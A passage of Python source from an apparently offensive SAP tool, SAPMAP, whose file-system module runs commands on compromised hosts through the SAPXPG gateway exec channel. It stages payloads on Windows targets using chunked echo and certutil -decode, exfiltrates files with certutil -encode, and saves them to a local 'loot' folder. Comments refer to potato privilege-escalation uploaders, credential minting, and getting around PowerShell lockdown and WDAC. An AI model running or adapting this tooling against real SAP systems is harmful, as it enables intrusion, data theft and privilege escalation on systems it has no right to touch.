                  f"{len(entries)} entries with metadata")
            return entries
        print(f"[-] {self.label}: every name-listing fallback "
              f"returned empty on {remote_path} — SAPXPG channel "
              f"is silently dropping stdout even for compact output")
        return None

    def _extract_names(self, lines: list, remote_path: str,
                        tag: str) -> list:
        """Extract a deduplicated list of basenames from bare
        ls / find output.  Handles both one-per-line and
        multi-column outputs."""
        names = []
        seen = set()
        dir_prefix = remote_path.rstrip("/") + "/"
        for line in lines:
            s = line.rstrip()
            if not s:
                continue
            # find prints full paths — strip the leading dir_prefix.
            # ls -1 prints one name per line.
            # bare ls prints multi-column (whitespace-separated).
            if tag == "find":
                tokens = [s]
            else:
                # Multi-column and single-column both split cleanly
                # on whitespace.  Filenames with embedded spaces
                # would break this, but they're extremely rare in
                # /tmp / /etc / /var/log and the operator can fall
                # back to specifying an explicit subdirectory.
                tokens = s.split()
            for tok in tokens:
                name = tok.strip()
                if not name:
                    continue
                if name.startswith(dir_prefix):
                    name = name[len(dir_prefix):]
                # Trailing slash on some ls builds when -F/--classify
                # is default via alias — keep as an is_dir hint but
                # strip from the name.
                name = name.rstrip("/")
                if not name or name in (".", ".."):
                    continue
                # Skip lines that are obviously error text.
                lo = name.lower()
                if lo in ("total",):
                    continue
                if name in seen:
                    continue
                seen.add(name)
                names.append(name)
        return names

    def _batched_stat(self, dir_path: str, names: list) -> list:
        """Run ``stat -c '%n|%s|%y|%a|%F' <p1> <p2> ...`` in batches.

        Batch size is picked so the PARAMS payload stays well under
        the SAPXPG 255 B limit — we sum the joined path lengths and
        cut the batch when the next path would push us past the
        budget.  Output is parsed line-by-line; each line is
        ``<full_path>|<size>|<mtime>|<mode>|<type>``.
        """
        # Reserve PARAMS budget for "-c %n|%s|%y|%a|%F " prefix + safety.
        _PARAMS_BUDGET = 220
        prefix = "-c %n|%s|%y|%a|%F"
        dir_prefix = dir_path.rstrip("/")
        by_name = {n: {"name":   n,
                        "size":   0,
                        "is_dir": False,
                        "mtime":  "",
                        "mode":   ""} for n in names}

        # Build batches
        batches = []
        current = []
        current_len = len(prefix) + 1
        for name in names:
            full = f"{dir_prefix}/{name}"
            add_len = len(full) + 1
            if current and current_len + add_len > _PARAMS_BUDGET:
                batches.append(current)
                current = []
                current_len = len(prefix) + 1
            current.append(full)
            current_len += add_len
        if current:
            batches.append(current)

        for bi, batch in enumerate(batches, 1):
            params = prefix + " " + " ".join(batch)
            r = self.exec_fn("/usr/bin/stat", params)
            for line in r.get("output", []) or []:
                s = line.strip()
                if not s or "|" not in s:
                    continue
                lo = s.lower()
                if "cannot stat" in lo or "no such" in lo:
                    continue
                parts = s.split("|", 4)
                if len(parts) < 5:
                    continue
                full_path, size_str, mtime, mode, ftype = parts
                base = os.path.basename(full_path.rstrip("/"))
                if base not in by_name:
                    continue
                try:
                    size = int(size_str)
                except ValueError:
                    size = 0
                by_name[base].update({
                    "size":   size,
                    "is_dir": "directory" in ftype.lower(),
                    "mtime":  mtime,
                    "mode":   mode,
                })
            if bi % 5 == 0 or bi == len(batches):
                print(f"[*] {self.label}: stat batch "
                      f"{bi}/{len(batches)} — "
                      f"{min(bi * _PARAMS_BUDGET // 20, len(names))} "
                      f"names covered")
        return list(by_name.values())

    def _stat_linux(self, remote_path: str) -> dict:
        """Read size / mtime / mode / is_dir via ``stat -c``.

        Output format: ``<size>|<mtime>|<mode_octal>|<type>``
        where type is 'directory', 'regular file', 'symbolic link'.
        """
        fmt = "%s|%y|%a|%F"
        r = self.exec_fn("/usr/bin/stat", f"-c {fmt} {remote_path}")
        lines = r.get("output", [])
        for line in lines:
            s = line.strip()
            lo = s.lower()
            if "cannot stat" in lo or "no such" in lo:
                return {"ok": True, "exists": False, "size": 0,
                         "is_dir": False, "mtime": "", "mode": "",
                         "error": ""}
            parts = s.split("|")
            if len(parts) >= 4:
                try:
                    size = int(parts[0])
                except ValueError:
                    continue
                mtime = parts[1]
                mode = parts[2]
                ftype = parts[3].lower()
                return {"ok": True, "exists": True, "size": size,
                         "is_dir": "directory" in ftype,
                         "mtime": mtime, "mode": mode, "error": ""}
        return {"ok": False, "exists": False, "size": 0,
                 "is_dir": False, "mtime": "", "mode": "",
                 "error": "stat output unreadable — check exec channel "
                          "P3/P4 stdout capture on this kernel"}

    # ------------------------------------------------------------------
    # Windows implementations
    # ------------------------------------------------------------------
    #
    # Design: use ``cmd.exe /C ...`` for every call so the exec channel
    # (GW SAPXPG or SXPG) sees a single argv0 with the whole command
    # line stuffed into PARAMS.  Same shape the OS terminal and every
    # other Windows-target module in SAPMAP uses.
    #
    # Byte transport uses certutil, which is present on every supported
    # Windows Server SKU (2012+) and doesn't require PowerShell — some
    # hardened hosts have PS locked down under Constrained Language Mode
    # or WDAC, but certutil is a Microsoft-signed binary in system32 and
    # is almost never blocked.
    #
    # ``certutil -encode <file> <tmp>`` produces a PEM-wrapped base64
    # file (76-char lines) — pretty-close to Linux ``base64``'s output
    # so ``_decode_certutil_b64`` unwraps it the same way.
    #
    # ``certutil -decode <tmp> <file>`` is the reverse operation.

    # EXTPROG budget for upload echo.  The full command line
    # ``cmd.exe /C echo <chunk>>>"<tmp_path>"`` must fit in the
    # 128-byte EXTPROG field.  Overhead is ~60 chars (cmd prefix +
    # redirection op + quoted temp path), leaving ~68 for the b64
    # chunk.  Use 60 with safety margin.
    _WIN_CHUNK_B64_CHARS = 60

    _WIN_TMP_DIR = "C:\\Windows\\Temp"

    def _win_tmp(self, suffix: str) -> str:
        """Compose a random-suffixed temp path in the target's
        ``%SYSTEMROOT%\\Temp``.  SAPXPG runs under a service account
        with reliable write access there on every kernel SAPMAP has
        seen in the field."""
        import random as _r
        import string as _s
        tag = "".join(_r.choice(_s.ascii_lowercase) for _ in range(8))
        return f"{self._WIN_TMP_DIR}\\sapmap_{tag}{suffix}"

    def _win_tmp_near(self, remote_path: str, suffix: str) -> str:
        """Temp path in the same directory as ``remote_path``.

        Avoids ``C:\\Windows\\Temp`` ACL issues: that directory's
        CREATOR OWNER ACE means files certutil writes can't be read
        back by ``type`` when they run under different thread contexts
        in the SAPXPG service.  Putting the temp next to the source
        guarantees both have the same NTFS permissions."""
        import random as _r
        import string as _s
        tag = "".join(_r.choice(_s.ascii_lowercase) for _ in range(8))
        p = remote_path.replace("/", "\\")
        idx = p.rfind("\\")
        parent = p[:idx] if idx >= 0 else self._WIN_TMP_DIR
        return f"{parent}\\sapmap_{tag}{suffix}"

    # EXTPROG field is 128 bytes.  "cmd.exe /C " prefix is 11 chars,
    # leaving 117 for the tail.  Commands under this threshold go
    # entirely in EXTPROG (stdout works on GW SAPXPG).  Longer ones
    # must split program/args — stdout may be empty for some commands
    # but at least the command executes without truncation.
    _EXTPROG_MAX = 128
    _EXTPROG_PREFIX = "cmd.exe /C "
    _EXTPROG_TAIL_MAX = _EXTPROG_MAX - len(_EXTPROG_PREFIX)

    def _win_cmd(self, tail: str) -> dict:
        """Run ``cmd.exe /C <tail>``.  ``tail`` must be a single
        command line — no argv splitting.  Returns the raw exec_fn
        dict so callers can inspect ``output`` / ``error`` /
        ``success`` themselves.

        Short commands go entirely in EXTPROG (program arg) with
        PARAMS left empty — matching the OS terminal pattern that
        makes GW SAPXPG stdout capture work.  Commands longer than
        EXTPROG's 128-byte field fall back to program=cmd.exe,
        args=/C <tail> — stdout may be dropped on some kernels but
        the command at least executes without truncation."""
        full = f"cmd.exe /C {tail}"
        if len(full) <= self._EXTPROG_MAX:
            return self.exec_fn(full, "")
        return self.exec_fn("cmd.exe", f"/C {tail}")

    def _upload_windows(self, remote_path: str, content: bytes,
                          progress_cb: "Optional[Callable[[int,int,str],None]]" = None
                          ) -> dict:
        """Upload via chunked ``cmd.exe /C echo <b64> >> file`` +
        ``certutil -decode``.  Same recipe as the existing GodPotato /
        MiniPlasma / EfsPotato uploaders — kept private here so this
        module remains standalone.
        """
        b64 = base64.b64encode(content).decode("ascii")
        chunk_size = self._WIN_CHUNK_B64_CHARS
        chunks = [b64[i:i + chunk_size]
                   for i in range(0, len(b64), chunk_size)]
        total_bytes = len(content)
        tmp_b64 = self._win_tmp(".b64")

        # Wipe stale files at the target path AND our tmp b64 file.
        self._win_cmd(f'del /q /f "{remote_path}" "{tmp_b64}" 2>nul')

        def _emit(done: int, phase: str) -> None:
            if progress_cb:
                try:
                    progress_cb(done, total_bytes, phase)
                except Exception:
                    pass

        _emit(0, "chunked")
        for i, chunk in enumerate(chunks):
            op = ">" if i == 0 else ">>"
            r = self._win_cmd(f'echo {chunk}{op}"{tmp_b64}"')
            if not r.get("success"):
                self._win_cmd(f'del /q /f "{tmp_b64}" 2>nul')
                return {"ok": False,
                         "error": (f"chunk {i + 1}/{len(chunks)} "
                                   f"failed at exec: "
                                   f"{r.get('error', '?')}"),
                         "chunks": i, "chunk_size": chunk_size}
            done_est = min(total_bytes,
                            ((i + 1) * total_bytes) // len(chunks))
            _emit(done_est, "chunked")

        # certutil -decode: b64 → target path
        r = self._win_cmd(
            f'certutil -decode "{tmp_b64}" "{remote_path}" >nul')
        # certutil returns 0 on success; on failure it prints
        # "CertUtil: -decode command FAILED: 0x<hex>" to stdout.
        out_joined = " ".join(r.get("output", [])).lower()
        if not r.get("success") or "failed" in out_joined:
            self._win_cmd(f'del /q /f "{tmp_b64}" 2>nul')
            return {"ok": False,
                     "error": (f"certutil -decode failed: "
                               f"{' '.join(r.get('output', []))[:200]}"),
                     "chunks": len(chunks), "chunk_size": chunk_size}

        # Cleanup
        self._win_cmd(f'del /q /f "{tmp_b64}" 2>nul')
        return {"ok": True, "error": "",
                 "chunks": len(chunks), "chunk_size": chunk_size}

    def _remote_md5_windows(self, remote_path: str) -> str:
        """MD5 hex of ``remote_path`` via ``certutil -hashfile ... MD5``.
        Returns empty string on any failure — same contract as the
        Linux equivalent."""
        r = self._win_cmd(
            f'certutil -hashfile "{remote_path}" MD5')
        for line in r.get("output", []):
            s = line.strip().replace(" ", "").lower()
            if len(s) == 32 and all(c in "0123456789abcdef" for c in s):
                return s
        return ""

    def _download_windows(self, remote_path: str, size: int,
                            progress_cb: "Optional[Callable[[int,int,str],None]]" = None
                            ) -> Optional[bytes]:
        """Fetch a file from the target via ``certutil -encode <path>
        <tmp>`` + ``type <tmp>`` in a single cmd.exe call, then
        strip the PEM wrapper and decode.

        SAPXPG can silently truncate large stdout — same story as the
        Linux GNU-base64 path.  If the decoded size doesn't match the
        stat size, return None so the caller reports a clean failure.
        (Chunked PowerShell fallback is possible but rarely needed —
        the operator can always use SXPG once creds are minted.)
        """
        def _emit(done: int, phase: str) -> None:
            if progress_cb:
                try:
                    progress_cb(done, size, phase)
                except Exception:
                    pass

        _emit(0, "single_shot")
        # Put temp file next to the source — avoids C:\Windows\Temp
        # ACL issue where certutil-created files can't be read back
        # by `type` (CREATOR OWNER ACL blocks cross-context reads).
        tmp = self._win_tmp_near(remote_path, ".b64")
        print(f"[*] {self.label}: download_windows({remote_path!r}, "
              f"size={size} B) via certutil -encode → {tmp}")
        # Step 1: certutil -encode → temp file (no stdout needed)
        r = self._win_cmd(
            f'certutil -encode "{remote_path}" "{tmp}"')
        raw_out = " ".join(r.get("output", []))
        out_lo = raw_out.lower()
        print(f"[*] {self.label}:   certutil -encode returned "
              f"success={r.get('success')} out={raw_out[:200]!r}")
        # Access denied?  certutil prints "Access is denied." to stdout
        # and exits non-zero.  Common when <sid>adm lacks NTFS read
        # permission on files owned by other services (e.g. TMS_TEST
        # files on P:\usr\sap\trans\tmp).
        if "access is denied" in out_lo or "access denied" in out_lo:
            self._win_cmd(f'del /q /f "{tmp}" 2>nul')
            msg = (f"Access denied reading {remote_path} — the exec "
                   f"channel's user (<sid>adm on GW SAPXPG) lacks NTFS "
                   f"read permission.  Try SXPG-authenticated channel "
                   f"or grant read to the SAP service account.")
            self._last_download_error = msg
            print(f"[-] {self.label}: {msg}")
            return None
        if "failed" in out_lo or not r.get("success"):
            self._win_cmd(f'del /q /f "{tmp}" 2>nul')
            msg = (f"certutil -encode failed for {remote_path}: "
                   f"{raw_out[:200]}")
            self._last_download_error = msg
            print(f"[-] {self.label}: {msg}")
            return None
        # Step 2: type the temp file to read the b64 payload
        r = self._win_cmd(f'type "{tmp}"')
        out_text = "\n".join(r.get("output", []))
        # Step 3: cleanup
        self._win_cmd(f'del /q /f "{tmp}" 2>nul')
        decoded = _decode_certutil_b64(out_text)
        if decoded is None:
            msg = (f"certutil -encode succeeded but the base64 payload "
                   f"was unreadable via `type` — raw: {out_text[:200]!r}")
            self._last_download_error = msg
            print(f"[-] {self.label}: {msg}")
            return None
        if len(decoded) != size:
            msg = (f"certutil -encode returned {len(decoded)} B, "
                   f"expected {size} — SAPXPG probably truncated "
                   f"stdout on this large file.  Try SXPG (create "
                   f"credentials + escalate first) or a smaller file.")
            self._last_download_error = msg
            print(f"[-] {self.label}: {msg}")
            return None
        _emit(size, "single_shot")
        print(f"[+] {self.label}:   downloaded {size} B via certutil")
        return decoded

    def enumerate_drives(self) -> dict:
        """List available drive letters on a Windows target.

        Uses ``wmic logicaldisk get name`` which works on every
        Windows Server SKU SAPMAP supports (2012+).  Returns::

            {
              ok:      bool,
              drives:  ["C:", "D:", "P:", ...],
              error:   str,
            }
        """
        if self.os_family != "windows":
            return {"ok": False, "drives": [],
                     "error": "drive enumeration is Windows-only"}
        r = self._win_cmd("wmic logicaldisk get name")
        lines = r.get("output", []) or []
        drives = []
        for ln in lines:
            s = ln.strip()
            if re.match(r"^[A-Za-z]:$", s):
                drives.append(s.upper())
        if not drives:
            r2 = self._win_cmd("fsutil fsinfo drives")
            for ln in r2.get("output", []) or []:
                for tok in re.findall(r"([A-Za-z]):\\", ln):
                    d = tok.upper() + ":"
                    if d not in drives:
                        drives.append(d)
        if not drives:
            return {"ok": False, "drives": [],
                     "error": "wmic/fsutil returned no drive letters"}
        drives.sort()
        return {"ok": True, "drives": drives, "error": ""}

    def _list_dir_windows(self, remote_path: str) -> dict:
        """List a directory via ``dir /-C /A /Q``.

        ``/-C`` = no thousands separator in Size (easier to parse).
        ``/A``  = include hidden + system files.
        ``/Q``  = include the file owner (harmless — we ignore it).

        cmd's ``dir`` output format for each entry (space-separated):
          <date> <time> <AM/PM?> <size|<DIR>> [owner] <name>

        Special case: single-file target — ``dir <file>`` still works
        and returns a single-entry listing; we route that through
        stat first so the UI can offer a download button.
        """
        # Normalize bare drive letter "P:" → "P:\" so dir sees a root.
        if re.match(r"^[A-Za-z]:$", remote_path):
            remote_path = remote_path + "\\"

        # Short-circuit for a file path so the operator can type
        # C:\Windows\System32\drivers\etc\hosts and get a download link.
        st = self._stat_windows(remote_path)
        if st.get("ok") and st.get("exists") and not st.get("is_dir"):
            basename = ntpath_basename(remote_path)
            return {"ok": True, "path": remote_path,
                     "entries": [{
                        "name":   basename,
                        "size":   st.get("size", 0),
                        "is_dir": False,
                        "mtime":  st.get("mtime", ""),
                        "mode":   st.get("mode", ""),
                        "abs_path": remote_path,
                     }],
                     "error": ""}

        print(f"[*] {self.label}: list_dir_windows({remote_path!r}) — "
              f"trying `dir /-C /A`")
        r = self._win_cmd(f'dir /-C /A "{remote_path}"')
        lines = r.get("output", []) or []
        print(f"[*] {self.label}:   dir /-C /A returned "
              f"success={r.get('success')} lines={len(lines)}")
        if lines and len(lines) <= 3:
            print(f"[*] {self.label}:   raw output: "
                  f"{[l[:100] for l in lines]!r}")
        if lines:
            first_lo = lines[0].lower()
            if "file not found" in first_lo \
                    or "path not found" in first_lo \
                    or "cannot find" in first_lo:
                return {"ok": False, "path": remote_path, "entries": [],
                         "error": lines[0].strip()}
            if "access is denied" in first_lo \
                    or "access denied" in first_lo:
                return {"ok": False, "path": remote_path, "entries": [],
                         "error": ("Access denied — <sid>adm lacks "
                                    "read permission on this path")}

        entries = []
        seen = set()
        for line in lines:
            entry = _parse_win_dir_line(line)
            if not entry:
                continue
            key = (entry["name"], entry.get("size", -1))
            if key in seen:
                continue
            seen.add(key)
            entries.append(entry)

        if entries:
            print(f"[+] {self.label}:   parsed {len(entries)} entries "
                  f"from dir /-C /A output")
            return {"ok": True, "path": remote_path,
                     "entries": entries, "error": ""}

        # Fallback: dir /B (bare names, one per line) — much less
        # stdout than dir /-C /A, survives GW SAPXPG buffer limits
        # on populous dirs.  Then batched stat for metadata.
        print(f"[*] {self.label}:   dir /-C /A returned no parseable "
              f"entries — trying `dir /B /A` fallback")
        entries = self._list_dir_via_names_windows(remote_path)
        if entries is not None:
            return {"ok": True, "path": remote_path,
                     "entries": entries, "error": ""}

        # Last resort: redirect dir output to a temp file, then download
        # the file via certutil.  Bypasses SAPXPG's stdout buffer entirely.
        print(f"[*] {self.label}:   dir /B /A also empty — trying "
              f"file-redirect fallback (dir > tmp + certutil download)")
        entries = self._list_dir_via_file_redirect_windows(remote_path)
        if entries is not None:
            return {"ok": True, "path": remote_path,
                     "entries": entries, "error": ""}

        print(f"[-] {self.label}:   ALL Windows listing strategies "
              f"failed for {remote_path} — the exec channel returned "
              f"no output for any listing variant.")
        return {"ok": False, "path": remote_path, "entries": [],
                 "error": ("All dir listing methods returned empty — "
                           "the exec channel dropped stdout even for "
                           "bare-names + file-redirect fallbacks.  "
                           "Check that the exec channel can reach this "
                           "path (permissions, network shares).")}

    def _list_dir_via_names_windows(self, remote_path: str
                                      ) -> Optional[list]:
        """Names-only fallback for populous Windows dirs.

        ``dir /B /A`` outputs one bare filename per line — far less
        stdout than ``dir /-C /A`` which includes dates, sizes, and
        summary lines.  After collecting names, stat each entry via
        individual ``dir /-C /A "<path>\\<name>"`` calls to retrieve
        size, mtime, and is_dir.
        """
        r = self._win_cmd(f'dir /B /A "{remote_path}"')
        lines = r.get("output", []) or []
        print(f"[*] {self.label}:   dir /B /A returned "
              f"success={r.get('success')} lines={len(lines)}")
        if not lines:
            return None
        first_lo = lines[0].lower()
        if "file not found" in first_lo or "path not found" in first_lo:
            print(f"[-] {self.label}:   dir /B /A: {lines[0].strip()}")
            return None
        if "access is denied" in first_lo or "access denied" in first_lo:
            print(f"[-] {self.label}:   dir /B /A: access denied "
                  f"— <sid>adm cannot read {remote_path}")
            return None
        names = []
        seen = set()
        for ln in lines:
            name = ln.strip()
            if not name or name in (".", ".."):
                continue
            if name.lower() in seen:
                continue
            seen.add(name.lower())
            names.append(name)
        if not names:
            return None
        print(f"[*] {self.label}: dir /B → {len(names)} names in "
              f"{remote_path}; batched stat for metadata")
        entries = self._batched_stat_windows(remote_path, names)
        return entries

    def _batched_stat_windows(self, dir_path: str,
                                names: list) -> list:
        """Stat each name via individual ``dir /-C /A`` calls."""
        dp = dir_path.rstrip("\\")
        entries = []
        for name in names:
            full = f"{dp}\\{name}"
            st = self._stat_windows(full)
            entries.append({
                "name":   name,
                "size":   st.get("size", 0),
                "is_dir": st.get("is_dir", False),
                "mtime":  st.get("mtime", ""),
                "mode":   "<DIR>" if st.get("is_dir") else "",
            })
        return entries

    def _list_dir_via_file_redirect_windows(self, remote_path: str
                                               ) -> Optional[list]:
        """Last-resort fallback: redirect dir output to a temp file,
        then read the file back via ``type``.

        Bypasses SAPXPG's stdout buffer entirely — the dir output is
        written to the target filesystem instead of flowing through
        the exec channel's P3/P4 TLV frames.  The temp file is then
        read back via ``type`` which works reliably for small files.

        Flow:
          1. ``dir /B /A "path" > tmpfile``  (no stdout — redirect)
          2. ``type "tmpfile"``              (read names back)
          3. ``del /q /f "tmpfile" 2>nul``   (cleanup)
          4. Parse names → batched stat for metadata
        """
        # Use a dummy file name inside the listed directory as the
        # anchor for _win_tmp_near — avoids the C:\Windows\Temp ACL
        # issue.  If the directory itself is not writable (unlikely
        # for dirs we can enumerate), _win_cmd will fail gracefully.
        tmp = self._win_tmp_near(
            remote_path.rstrip("\\") + "\\x", ".dir")
        print(f"[*] {self.label}:   file-redirect: "
              f'dir /B /A "{remote_path}" > "{tmp}"')
        self._win_cmd(f'dir /B /A "{remote_path}" >"{tmp}"')

        r = self._win_cmd(f'type "{tmp}"')
        lines = r.get("output", []) or []
        print(f"[*] {self.label}:   file-redirect: type returned "
              f"{len(lines)} lines")
        self._win_cmd(f'del /q /f "{tmp}" 2>nul')

        if not lines:
            print(f"[-] {self.label}:   file-redirect: type returned "
                  f"empty — tmpfile was not written or is empty")
            return None
        first_lo = lines[0].lower()
        if "file not found" in first_lo or "path not found" in first_lo:
            print(f"[-] {self.label}:   file-redirect: {lines[0].strip()}")
            return None

        names = []
        seen = set()
        for ln in lines:
            name = ln.strip()
            if not name or name in (".", ".."):
                continue
            if name.lower() in seen:
                continue
            seen.add(name.lower())
            names.append(name)
        if not names:
            print(f"[-] {self.label}:   file-redirect: no valid names "
                  f"parsed from {len(lines)} lines")
            return None
        print(f"[*] {self.label}:   file-redirect: {len(names)} names → "
              f"batched stat")
        return self._batched_stat_windows(remote_path, names)

    def _stat_windows(self, remote_path: str) -> dict:
        """Get size / mtime / is_dir via ``dir /-C /A <path>``.

        We reuse dir here (rather than PowerShell Get-Item) because
        cmd is universally available and doesn't trip CLM/WDAC.
        For a file, dir prints one entry line with the file's own
        row; for a directory it prints a full listing — we detect
        that case by looking at the summary line
        (``N File(s)`` / ``N Dir(s)``) and reporting is_dir=True.
        """
        if re.match(r"^[A-Za-z]:$", remote_path):
            remote_path = remote_path + "\\"
        r = self._win_cmd(f'dir /-C /A "{remote_path}"')
        lines = r.get("output", []) or []
        if not lines:
            return {"ok": False, "exists": False, "size": 0,
                     "is_dir": False, "mtime": "", "mode": "",
                     "error": "dir returned no output"}
        joined_lo = "\n".join(lines).lower()
        if "file not found" in joined_lo \
                or "the system cannot find" in joined_lo \
                or "path not found" in joined_lo:
            return {"ok": True, "exists": False, "size": 0,
                     "is_dir": False, "mtime": "", "mode": "",
                     "error": ""}

        basename = ntpath_basename(remote_path).lower()

        # If any entry line names this basename OR carries <DIR>
        # matching the parent dir, we have a hit.  Simpler heuristic:
        # try to find an entry whose parsed name equals basename.
        parent_entry = None
        for line in lines:
            e = _parse_win_dir_line(line)
            if not e:
                continue
            if e["name"].lower() == basename:
                parent_entry = e
                break

        # If the parent scan didn't find a same-named entry, the path
        # is very likely a directory (its own listing).  Use the
        # summary line as confirmation.
        is_dir = False
        for line in lines:
            l = line.lower()
            if " dir(s)" in l and " bytes free" in l:
                is_dir = True
                break

        if parent_entry:
            return {"ok": True, "exists": True,
                     "size":   parent_entry.get("size", 0),
                     "is_dir": parent_entry.get("is_dir", False),
                     "mtime":  parent_entry.get("mtime", ""),
                     "mode":   parent_entry.get("mode", ""),
                     "error":  ""}
        if is_dir:
            return {"ok": True, "exists": True, "size": 0,
                     "is_dir": True, "mtime": "", "mode": "",
                     "error": ""}
        return {"ok": False, "exists": False, "size": 0,
                 "is_dir": False, "mtime": "", "mode": "",
                 "error": "dir output unreadable — check exec channel"}

    def _mkdir_windows(self, remote_path: str) -> dict:
        """``mkdir <path>`` — cmd's mkdir creates intermediate dirs
        automatically (equivalent to ``mkdir -p`` on Linux)."""
        r = self._win_cmd(f'mkdir "{remote_path}"')
        joined = " ".join(r.get("output", [])).lower()
        if "already exists" in joined:
            return {"ok": True, "error": ""}
        if r.get("success") and "cannot find" not in joined:
            return {"ok": True, "error": ""}
        return {"ok": False,
                 "error": " ".join(r.get("output", []))[:200]
                          or r.get("error", "mkdir failed")}

    # ------------------------------------------------------------------
    # Loot path helpers
    # ------------------------------------------------------------------

    def _loot_path(self, remote_path: str,
                    loot_dir: Optional[str], loot_subdir: str) -> str:
        """Compose a safe local loot path for a downloaded remote file.

        Strategy: ``loot/<subdir>/<sid>/<yyyymmdd_hhmmss>/<basename>``.
        The timestamp ensures multiple downloads of the same file
        don't clobber each other.  ``basename`` is sanitised —
        strips any path separators the remote might have snuck in.
        """
        if loot_dir is None:
            try:
                from sapmap_state import ensure_loot_dir
                base = ensure_loot_dir(loot_subdir)
            except Exception:
                base = os.path.join(os.getcwd(), "loot", loot_subdir)
            sid = getattr(self.node, "sid", "unknown")
            ts = time.strftime("%Y%m%d_%H%M%S")
            loot_dir = os.path.join(base, sid, ts)
        os.makedirs(loot_dir, exist_ok=True)
        # Strip any path separators / null bytes from the basename
        basename = os.path.basename(remote_path.replace("\\", "/"))
        basename = re.sub(r"[^A-Za-z0-9._-]", "_", basename) or "download"
        return os.path.join(loot_dir, basename)


# --------------------------------------------------------------------------
# ls -la parser (module-level for unit-testability)
# --------------------------------------------------------------------------

# Handles both ls output styles:
#
# 1. GNU coreutils with --time-style=iso:
#      -rw-r--r-- 1 owner group 12345 2026-08-20T09:00:00 name
#      lrwxrwxrwx 1 owner group    12 2026-08-20T09:00:00 link -> target
#
# 2. Traditional ls (BSD, busybox, or GNU without --time-style):
#      -rw-r--r-- 1 owner group 12345 Aug 20 09:00 name
#      -rw-r--r-- 1 owner group 12345 Aug 20  2025 name
#
# We split on whitespace and figure out the mtime length from the
# token count.  Simpler and more robust than a fat regex.


def _parse_ls_line(line: str) -> Optional[dict]:
    """Parse a single ``ls -la`` line into an entry dict, or None if
    the line is a header (``total 42``), blank, or unparseable."""
    s = line.rstrip()
    if not s:
        return None
    if s.startswith("total "):
        return None
    # Strip a symlink "-> target" suffix up front so it doesn't
    # confuse token counting (e.g. "... mylink -> target").
    if " -> " in s:
        s = s.split(" -> ", 1)[0].rstrip()

    parts = s.split()
    if len(parts) < 7:
        return None
    mode = parts[0]
    if not (mode and mode[0] in "-dlbcps"):
        return None
    # Size is the first purely-numeric token after positions 3-5
    # (positions 1-3 are nlink + owner + group; owner/group can be
    # numeric so we scan by position).  For standard ls the size
    # sits at parts[4].
    try:
        size = int(parts[4])
    except (ValueError, IndexError):
        return None

    # Detect mtime span:
    #   ISO:         parts[5] contains "T" or "-" → 1 token
    #   Traditional: parts[5] is a month name → 3 tokens (Mon DD HH:MM|YYYY)
    if "T" in parts[5] or "-" in parts[5]:
        mtime_tokens = 1
    else:
        mtime_tokens = 3
    name_start = 5 + mtime_tokens
    if len(parts) < name_start + 1:
        return None
    mtime = " ".join(parts[5:name_start])
    # Rejoin the remaining tokens so filenames with spaces survive.
    name = " ".join(parts[name_start:])

    if name in (".", ".."):
        return None
    return {
        "name":   name,
        "size":   size,
        "is_dir": mode[0] == "d",
        "mtime":  mtime,
        "mode":   mode,
    }


# --------------------------------------------------------------------------
# Windows helpers (module-level for unit-testability)
# --------------------------------------------------------------------------

def ntpath_basename(path: str) -> str:
    """Split a Windows path on \\ or /.  Simpler than importing
    ntpath — SAPMAP already tolerates mixed separators everywhere
    (operators sometimes type C:/Windows/System32/... in the address
    bar, sometimes C:\\Windows\\System32\\...)."""
    p = path.rstrip("\\/")
    for sep in ("\\", "/"):
        idx = p.rfind(sep)
        if idx >= 0:
            p = p[idx + 1:]
    return p


# certutil -encode output shape:
#   -----BEGIN CERTIFICATE-----
#   <base64 lines wrapped at 64 chars>
#   -----END CERTIFICATE-----
#
# Same helper lives in sapmap_miniplasma._decode_certutil_b64; ported
# here so TargetFS remains standalone (no cross-module dependency on
# an exploit helper that could be renamed).

def _decode_certutil_b64(text: str) -> Optional[bytes]:
    """Strip the PEM ``-----BEGIN/END CERTIFICATE-----`` wrappers
    certutil emits and decode the inner base64.

    Returns None when the input contains no BEGIN marker (certutil
    printed an error or SAPXPG dropped the whole reply) or when the
    inner payload is empty / malformed."""
    if not text:
        return None
    payload_lines = []
    in_payload = False
    for ln in text.replace("\r", "").split("\n"):
        if ln.startswith("-----BEGIN"):
            in_payload = True
            continue
        if ln.startswith("-----END"):
            in_payload = False
            continue
        if in_payload:
            payload_lines.append(ln.strip())
    payload = "".join(payload_lines)
    if not payload:
        return None
    # Pad and lenient-decode — SAPXPG truncation can leave the tail
    # short of a 4-char boundary.
    payload += "=" * ((4 - len(payload) % 4) % 4)
    try:
        return base64.b64decode(payload, validate=False)
    except Exception:
        return None


# `dir /-C /A <path>` output for a single entry, e.g.:
#     08/20/2026  09:00 AM             1,234 hosts       (US locale, /C)
#     08/20/2026  09:00 AM              1234 hosts       (US locale, /-C — no thousands)
#     08/20/2026  09:00 AM    <DIR>          System32
#     20/08/2026  09:00                 1234 hosts       (24h non-US locale)
#     20.08.2026  09:00                 1234 hosts       (DE locale)
#
# Header/summary lines we want to skip:
#     Volume in drive C is Windows
#     Directory of C:\Windows\System32\drivers\etc
#     42 File(s)      12345 bytes
#      3 Dir(s)  99999999 bytes free
#
# We detect data rows by the leading date-token shape and split off
# the date+time+size prefix from the trailing name (which can contain
# spaces).  Owner column (from /Q) is ignored — we don't use it.

_WIN_DATE_RE = re.compile(
    r"^\s*(\d{1,2}[./-]\d{1,2}[./-]\d{2,4})\s+"        # date
    r"(\d{1,2}:\d{2}(?::\d{2})?)"                        # time
    r"(?:\s+([AP]M))?\s+"                                # optional AM/PM
)


def _parse_win_dir_line(line: str) -> Optional[dict]:
    """Parse a single ``dir /-C /A`` data row into an entry dict.
    Returns None on header/summary lines or unparseable input."""
    s = line.rstrip()
    if not s:
        return None
    m = _WIN_DATE_RE.match(s)
    if not m:
        return None
    date_tok, time_tok, ampm = m.group(1), m.group(2), m.group(3)
    rest = s[m.end():]
    if not rest.strip():
        return None

    # Detect <DIR> marker.  It sits where the size number would.
    is_dir = False
    size = 0
    tail = rest.lstrip()
    if tail.startswith("<DIR>"):
        is_dir = True
        tail = tail[len("<DIR>"):].lstrip()
    else:
        # First whitespace-run separates size from name.
        parts = tail.split(None, 1)
        if not parts:
            return None
        size_tok = parts[0].replace(",", "").replace(".", "")
        try:
            size = int(size_tok)
        except ValueError:
            return None
        tail = parts[1] if len(parts) > 1 else ""

    name = tail.strip()
    if not name or name in (".", ".."):
        return None

    mtime = f"{date_tok} {time_tok}" + (f" {ampm}" if ampm else "")
    return {
        "name":   name,
        "size":   size,
        "is_dir": is_dir,
        "mtime":  mtime,
